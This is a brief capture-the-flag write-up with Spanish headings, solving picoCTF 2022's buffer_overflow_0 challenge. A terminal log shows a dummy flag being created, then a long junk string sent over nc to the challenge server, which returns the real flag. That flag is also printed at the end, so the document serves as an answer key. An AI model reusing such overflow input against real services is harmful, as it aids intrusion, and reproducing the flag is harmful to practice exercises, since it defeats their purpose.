**Descripcion**





**Solucion**
```bash
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ ls
vuln  vuln.c
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ ls -la
total 20
drwxrwx--- 1 root vboxsf     0 nov 22 08:47 .
drwxrwx--- 1 root vboxsf     0 nov 22 08:47 ..
-rwxrwx--- 1 root vboxsf 16016 nov 22 08:47 vuln
-rwxrwx--- 1 root vboxsf   808 nov 22 08:47 vuln.c
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ chmod +x vuln
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ ./vuln           
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ "ls                                                          
dquote> 
dquote> 
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ ls    
vuln  vuln.c
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ echo 'flag{dummie}' > flag.txt                             
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ ./vuln
Input: ana
The program will exit now
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ nc saturn.picoctf.net 65355
Input: kaslasndjsnjdksnfjdknkjdsfkjsdnsfkjdfhkjsdfkjsdfjksd
picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}
                                                                                
┌──(espasandia24㉿kali)-[~/…/retos Pico CTF/2022/Binario/buffer_overflow_0]
└─$ 
```

picoCTF{ov3rfl0ws_ar3nt_that_bad_34d6b87f}